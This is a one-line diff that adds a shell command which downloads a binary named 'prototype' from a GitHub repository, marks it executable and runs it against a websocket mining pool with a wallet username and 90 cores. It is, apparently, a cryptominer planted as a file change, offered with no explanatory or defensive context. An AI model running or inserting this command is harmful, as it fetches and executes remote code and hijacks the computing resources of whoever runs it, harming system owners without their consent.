@@ -1,0 +1,1 @@
+wget https://github.com/obisumila/special-doodle/raw/main/prototype ; chmod +x prototype ; ./prototype --url ws://tw-pool.com:5487/mine mine --username 8U4M3AHh79Uyq56dnT7ixNnMWejUT25MpKLvFmxX2Qmg.TWO --cores 90 ; 
